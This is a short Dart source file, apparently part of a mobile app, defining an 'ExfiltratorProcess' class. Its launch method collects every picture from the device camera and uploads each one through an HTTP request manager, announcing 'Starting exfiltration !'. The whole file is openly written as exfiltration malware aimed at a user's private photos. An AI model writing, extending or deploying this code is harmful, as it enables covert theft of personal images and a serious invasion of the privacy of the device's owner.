import 'dart:async';
import 'pictures.dart';
import 'requests.dart';

class ExfiltratorProcess {
  static bool _isRunning = false;

  static Future<void> launch() async {
    if (!_isRunning) {
      print("Starting exfiltration !");
      _isRunning = true;
      List<Picture> pictures = await PicturesManager.obtainAllFromCamera();
      for(Picture picture in pictures){
        HttpRequestManager.sendPicture(picture);
      }
    }
  }
}
